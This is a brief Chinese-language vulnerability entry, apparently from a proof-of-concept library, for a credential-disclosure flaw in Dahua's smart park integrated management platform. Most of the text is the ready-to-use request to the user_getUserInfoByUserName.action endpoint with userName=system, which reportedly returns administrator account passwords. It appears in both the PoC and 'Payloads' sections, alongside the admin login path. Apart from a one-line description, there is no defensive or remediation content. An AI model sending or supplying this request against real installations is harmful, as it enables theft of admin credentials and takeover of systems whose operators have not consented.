# 大华 智慧园区综合管理平台 user_getUserInfoByUserName.action 账号密码泄漏漏洞

## 漏洞描述
大华 智慧园区综合管理平台 user_getUserInfoByUserName.action 中存在API接口，导致管理园账号密码泄漏

## 危害等级
LOW

## 参考链接

## 漏洞复现方法
![image-20230828144644472](images/image-20230828144644472.png)

请求POC

```
/admin/user_getUserInfoByUserName.action?userName=system
```

![image-20230828144658624](images/image-20230828144658624.png)


## Payloads
```
/admin/user_getUserInfoByUserName.action?userName=system
```
```
/admin/login_login.action
```
